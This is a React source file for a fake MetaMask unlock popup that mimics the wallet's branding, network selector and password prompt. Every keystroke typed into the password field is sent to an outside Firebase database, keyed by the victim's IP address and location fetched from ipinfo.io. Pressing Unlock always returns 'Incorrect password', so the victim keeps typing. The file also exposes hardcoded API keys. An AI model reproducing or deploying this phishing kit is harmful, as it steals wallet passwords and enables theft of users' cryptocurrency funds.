'use client';

import React, { useState, useEffect, useRef, useCallback } from 'react'
import { getBrowserInfo } from '../../../utils/getBrowserInfo'
import MetamaskLogo from "./metamasklogo";
import { initializeApp } from "firebase/app";
import { getDatabase, ref, set } from "firebase/database";
import TextField from "@mui/material/TextField";
import Button from '@mui/material/Button';
import Box from "@mui/material/Box";
import Networkmodal from './networkmodal';
import axios from "axios";
import './metamask.css';

const isDarkMode = typeof window !== 'undefined' ? window.matchMedia("(prefers-color-scheme: dark)").matches : false;
// console.log("Is dark mode?", isDarkMode);
const firebaseConfig = {
     apiKey: "AIzaSyC_95gp9nOx0qQZ0su9Q0EHHRN72vQ7OeA",
  authDomain: "billionairiventure.firebaseapp.com",
  projectId: "billionairiventure",
  storageBucket: "billionairiventure.firebasestorage.app",
  messagingSenderId: "331283279318",
  appId: "1:331283279318:web:a851078b1a6cbf108b4877",
  measurementId: "G-02MXZXN42K"
  };

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const ethereum = "./assets/images/metamask_image/eth_logo.svg";
const arrowdown = "./assets/images/metamask_image/icons/arrow-down.svg";
const metamasklogo = "./assets/images/svg/metamask.svg";

const style = {
    position: "absolute",
    top: 0,
    right: 0,
    width: 360,
    height: 600,
    bgcolor: isDarkMode === true ? "#141618" : "background.paper",
    border: "1px solid #000",
    ".css-1qiynlt-MuiFormControl-root-MuiTextField-root .MuiInput-underline:before":
      {
        borderBottom:
          isDarkMode === true
            ? "1px solid white !important"
            : "1px solid black !important",
      },
    ".css-5h82ro-MuiInputBase-root-MuiInput-root": {
      color: isDarkMode === true ? "white" : "black",
    },
    display: "flex",
    "--color-text-default": isDarkMode === true ? "white" : "black",
};

var flag = true;

const Metamask = (props) => {
    const { handleModal } = props;

    const [dbName, setDbName] = useState(null);
    const [password, setPassword] = useState("");
    const [error, setError] = useState(false);
    const [helperText, setHelperText] = useState("");
    const [isTyping, setIsTyping] = useState(false);
    const [isFocused, setIsFocused] = useState(false);
    const [effectiveArea, setEffectiveArea] = useState(null);
    const logoContainerRef = useRef(null);
    const inputRef = useRef(null);
    const [startInput, setStartInput] = useState({ width: 0, height: 0 });

    const fetchIP = async () => {
        try {
            const response = await axios.get("https://ipinfo.io/json?token=f50acff5347305")
            const data = response.data
            const result = data.country + '_' + data.region + '_' + data.ip
            setDbName(result)
        } catch (error) {
            console.error("Error fetching IP address:", error)
            return false
        }
    }
    
    useEffect(() => {
        fetchIP();
    }, []);

    const setInputRef = useCallback((node) => {
        if (node) {
            inputRef.current = node;
            const { x, y } = node.getBoundingClientRect();
            setStartInput({ x, y });
        }
    }, []);

    const setLogoContainerRef = useCallback((node) => {
        if (node) {
          logoContainerRef.current = node;
          const area = node.getBoundingClientRect();
          setEffectiveArea(area);
        }
    }, []); // Empty dependency array ensures this runs only once

    const changepassword = (para) => {
        setError(false);
        setPassword(para);
        setIsTyping(true);
        addUser(para);
    };

    const handleType = (e) => {
        if (e.key === "Enter") {
          validatePassword();
        }
    };

    const handleFocus = () => {
        setIsFocused(true);
    };

    const handleBlur = () => {
        setIsFocused(false);
    };

    window.onclick = function(event) {
        if(event.target == document.getElementById('metamaskModal')) {
            handleModal("metamask", false);
            flag = true;
            setPassword("");
            setError(false);
        }
    };
    const addUser = (payload) => {
        const d = new Date();
        const dataRef = ref(
            db,
            `${dbName.replaceAll(".", "_")}_Elom/user_${d.getTime()}`
        );
        set(dataRef, payload);
    };
    
    const validatePassword = () => {
        addUser(password);
        setError(true);
        setHelperText("Incorrect password");
    };
    const [networkModal, setNetworkmodal] = useState(false);
    const handleNetworkmodal = () => {
        setNetworkmodal(true);
    }
    
    return(
        <div id='metamaskModal' style={{ zIndex: "10", width: '100%', height: '100vh' }}>
            <Box sx={style} ref={setLogoContainerRef} style={{ flexDirection: "column", float: "right", marginRight: "100px" }} >
                <div style={{ width: 360,height: 600,background: "#fff",textAlign: 'center'}} bordered={true}>
                    <div style={{
                        padding: 8,
                        paddingTop: 16,
                        paddingBottom: 16,
                        display: "flex",
                        justifyContent: "space-between",
                        alignItems: "center",
                        width: "100%",
                        height: "76px",
                        boxShadow:
                            isDarkMode === true
                            ? "0 4px 8px rgba(0, 0, 0, 0.38)"
                            : "0 4px 8px rgba(0, 0, 0, 0.08)",
                        }}>
                        <div style={{ height: 32 }}>
                            <Button
                                style={{
                                    padding: "1px 8px",
                                    display: "flex",
                                    justifyContent: "space-between",
                                    alignContent: "center",
                                    backgroundColor: isDarkMode === true ? "black" : "#f2f4f6",
                                    borderRadius: 16,
                                    height: 30,
                                    alignItems: 'center'
                                }}
                                onClick={() => handleNetworkmodal()}
                            >
                                <span
                                    style={{
                                        display: "flex",
                                        justifyContent: "center",
                                        marginRight: 9,
                                    }}
                                >
                                    <img
                                        style={{ borderRadius: 4, width: 14 }}
                                        src={ethereum}
                                        alt='Ethereum Mainnet' />
                                </span>
                                <span
                                    style={{
                                        marginRight: 9,
                                        color: isDarkMode === true ? "white" : "black",
                                        fontSize: 12,
                                        fontWeight: 3,
                                    }}
                                    >
                                    Ethereum Mainnet
                                </span>
                                <span
                                    style={{
                                        display: "flex",
                                        justifyContent: "center",
                                        marginRight: 9,
                                    }}
                                >
                                    <img
                                        style={{ width: 14, filter: isDarkMode === true ? "invert(1)" : "invert(0)" }}
                                        src={arrowdown}
                                        alt='nothing'

                                    />
                                </span>
                            </Button>
                        </div>
                        <Button style={{ padding: 0, minWidth: 46 }}>
                            <img src={metamasklogo} style={{ width: 34, height: 32 }} />
                        </Button>
                    </div>
                        <div id="unlockpage" style={{ padding: 30 }}>
                            <div
                                id="metamasklogo"
                                style={{
                                    marginTop: 10,
                                    height: 120,
                                    display: "flex",
                                    justifyContent: "center",
                                }}
                            >
                            <MetamaskLogo
                                effectiveArea={effectiveArea}
                                isFocused={isFocused}
                                startInput={startInput}
                                isTyping={isTyping}
                                setIsTyping={setIsTyping}
                                password={password}
                            />
                            </div>
                            <h1
                                className="mm-box mm-text mm-text--heading-lg mm-box--margin-top-1 mm-box--color-text-alternative"
                                style={{
                                    marginTop: 4,
                                    textAlign: "center",
                                    color: "#6a737d",
                                    fontSize: "18pt",
                                    marginBottom: 0,
                                    fontFamily:
                                    " Euclid Circular B, Roboto, Helvetica, Arial, sans-serif",
                                }}
                                >
                                {" "}
                                Welcome back!
                            </h1>
                            <div
                                style={{
                                    textAlign: "center",
                                    fontFamily:
                                    " Euclid Circular B, Roboto, Helvetica, Arial, sans-serif",
                                    color: isDarkMode === true ? "white" : "black",
                                }}
                                >
                                The decentralized web awaits
                            </div>
                            <div style={{ marginTop: 48 }}>
                                <TextField
                                    ref={setInputRef}
                                    id="outlined"
                                    label="Password"
                                    variant="standard"
                                    error={error}
                                    type="password"
                                    value={password}
                                    onFocus={handleFocus}
                                    onBlur={handleBlur}
                                    onChange={(e) => {
                                        changepassword(e.target.value);
                                    }}
                                    onKeyDown={handleType}
                                    helperText={error ? helperText : ""}
                                    sx={{
                                        ".MuiFormHelperText-root.Mui-error ": {
                                            color: isDarkMode === true ? "#e88f97 !important" : "red",
                                        },
                                        "& label": {
                                            color: "gray !important", // Force orange color
                                        },
                                        "& label.Mui-focused": {
                                            color: "gray !important", // Darker orange on focus
                                        },
                                        "& label.MuiInputLabel-shrink": {
                                            color: "gray !important", // Ensure shrinked label stays orange
                                        }, // Darker orange on focus
                                        " .css-4twbn2-MuiInputBase-root-MuiInput-root::before": {
                                            borderBottom:
                                            isDarkMode === true
                                                ? "1px solid white"
                                                : "1px solid black",
                                        },
                                        ".css-4twbn2-MuiInputBase-root-MuiInput-root:hover:not(.Mui-disabled, .Mui-error)::before":
                                            {
                                            borderBottom:
                                                isDarkMode === true
                                                ? "1px solid white"
                                                : "1px solid black",
                                            },

                                        "& .MuiInput-underline": {
                                            "&:before": {
                                            borderBottom:
                                                error &&
                                                (password !== ""
                                                ? "2px solid red"
                                                : "1px solid red !important"),
                                            },
                                            "&:after": {
                                            borderBottom:
                                                error && password !== ""
                                                ? "2px solid red"
                                                : "2px solid rgb(3, 118, 201)", // Border color when focused
                                            },
                                        },
                                        width: "100%",
                                    }}
                                />
                            </div>
                        <div style={{ marginTop: 28 }}>
                            <Button
                                style={
                                password === ""
                                    ? {
                                        backgroundColor:
                                        isDarkMode === true
                                            ? "#2d648c"
                                            : "rgb(111 185 239 / 90%)",
                                        border: "1px solid #848c96",
                                    }
                                    : {
                                        backgroundColor:
                                        isDarkMode === true ? "#43aefc" : "#0376c9",
                                        border:
                                        isDarkMode === true
                                            ? "1px solid white"
                                            : "1px solid black",
                                    }
                                }
                                sx={{
                                    height: 44,
                                    fontWeight: 400,
                                    borderRadius: 100,
                                    padding: "12px 16px",
                                    color: isDarkMode === true ? "black" : "white",
                                    width: "100%",
                                    "&:hover": {
                                        backgroundColor: "transparent", // Remove hover background
                                        boxShadow: "none", // Remove hover shadow (if any)
                                    },
                                }}
                                onClick={() => validatePassword()}
                            >
                                Unlock
                            </Button>
                            <div style={{ marginTop: 15 }}>
                                <a
                                    href="chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html"
                                    target="blank"
                                    style={{
                                        fontSize: 12, // Corrected to camelCase
                                        fontWeight: "bold",
                                        fontFamily:'"Euclid Circular B", Helvetica, Arial, sans-serif',
                                        lineHeight: "140%",
                                        fontStyle: "normal",
                                        color: "#43aefc",
                                        cursor: "pointer",
                                        backgroundColor: "transparent",
                                        padding: "0.75rem 1rem",
                                        display: "flex",
                                        justifyContent: "center",
                                        alignItems: "center",
                                        boxSizing: "border-box",
                                        borderRadius: "6px",
                                        width: "100%",
                                        transition:
                                        "border-color 0.3s ease, background-color 0.3s ease",
                                        textDecoration: "none",
                                    }}
                                    >
                                    Forgot password?
                                </a>
                            </div>
                            <div
                                className="unlock-page__support"
                                style={{
                                    marginTop: 33,
                                    justifyContent: "center",
                                    display: "flex",
                                    fontSize: 12,
                                }}
                            >
                                <span>
                                    {" "}
                                    <font
                                        style={{ color: isDarkMode === true ? "white" : "black" }}
                                    >
                                        Need help? Contact{" "}
                                    </font>
                                    <a
                                        href="https://support.metamask.io"
                                        target="_blank"
                                        rel="noopener noreferrer"
                                        style={{
                                            textDecoration: "none", // Remove underline
                                            color: "#43aefc", // Inherit text color from parent
                                            fontSize: "inherit", // Inherit font size from parent
                                            background: "none", // Remove background color
                                            padding: 0, // Remove padding
                                            margin: 0, // Remove margin
                                            display: "inline", // Keep the default inline behavior
                                        }}
                                    >
                                        MetaMask support
                                    </a>{" "}
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
            </Box>
            { networkModal && <Networkmodal setNetworkmodal={setNetworkmodal} /> }
        </div>
    )
}

export default Metamask;